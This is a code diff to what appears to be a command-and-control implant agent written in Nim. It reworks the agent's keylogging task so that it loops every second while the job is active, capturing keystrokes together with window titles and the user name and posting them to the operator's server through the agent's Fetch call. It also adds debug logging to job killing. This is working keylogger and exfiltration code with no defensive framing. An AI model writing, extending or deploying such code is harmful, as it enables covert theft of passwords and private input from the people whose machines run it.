@@ -4,7 +4,7 @@ import config
 import debug
 import json
 import http
-from sequtils import keepIf
+from sequtils import keepIf, anyIt
 import strformat
 import strutils
 from tables import pairs
@@ -113,30 +113,46 @@ proc jobLauncher*(runningJobs: seq[Job], tasks: seq[Task], curConfig: Config): F
             of "jobkill":
                # Keep all jobs where job id is not equal to passed in id to remove
                var curParams = task.parameters
+               debugMsg("jobseq before removing job with id of: ", curParams, $jobSeq)
                keepIf(jobSeq, proc(x: Job): bool = x.TaskId != curParams)
+               debugMsg("jobseq after: ", $jobSeq)
                jtemp.Success = true
             of "jobs":
                for job in runningJobs:
                   temp = temp & $(job) & "\n"
                jtemp.Success = true
             of "keylog":
+               var curId = task.id
                # Continously ship keystrokes every 30 seconds
-               debugMsg("Calling keylog")
-               let spawnResult = await keylog.execute()
-               debugMsg("Obtained spawnResult")
-               let user = await keylog.getUser()
-               for window, keystrokes in spawnResult.pairs:
-                  let shipJson = %*
-                     {
-                        "task_id": jtemp.TaskId,
-                        "user": user,
-                        "window_title": window,
-                        "keystrokes": keystrokes
-                     }
-                  let resp = when defined(AESPSK): await Fetch(curConfig, $(shipJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(shipJson)), true)
-                  debugMsg("resp for keystrokes for window: ", window, $(resp))
-               # Add to running jobs to continue keylogging
+               # Check if keylog is still within taskid if not discard
                jobSeq.add(jtemp)
+               debugMsg("Inside keylog the current jobSeq: ", $jobSeq)
+               while true:
+                  if jobSeq.anyIt(it.Taskid == jtemp.TaskId):
+                     debugMsg("Calling keylog")
+                     let spawnResult = await keylog.execute()
+                     debugMsg("Obtained spawnResult")
+                     let user = await keylog.getUser()
+                     let respJson = %*{"action" : "post_response", "responses": []}
+                     for window, keystrokes in spawnResult.pairs:
+                        let shipJson = %*
+                           {
+                              "task_id": jtemp.TaskId,
+                              "user": user,
+                              "window_title": window,
+                              "keystrokes": keystrokes
+                           }
+                        respJson["responses"].add(shipJson)
+                     let resp = when defined(AESPSK): await Fetch(curConfig, $(respJson), true) else: await Fetch(curConfig, encode(curConfig.PayloadUUID & $(respJson)), true)
+                     debugMsg("resp for keystrokes for window: ", respJson, $(resp))
+                  else:
+                     debugMsg("breaking")
+                     break
+                  # Sleep for 1 second
+                  debugMsg("sleeping")
+                  await sleepAsync(1000) 
+               # Add to running jobs to continue keylogging
+               # jobSeq.add(jtemp)
                # spawnResult = Table[Windows, keystrokes]
             of "kill":
                let spawnResult = await kill.execute(parseInt(task.parameters))
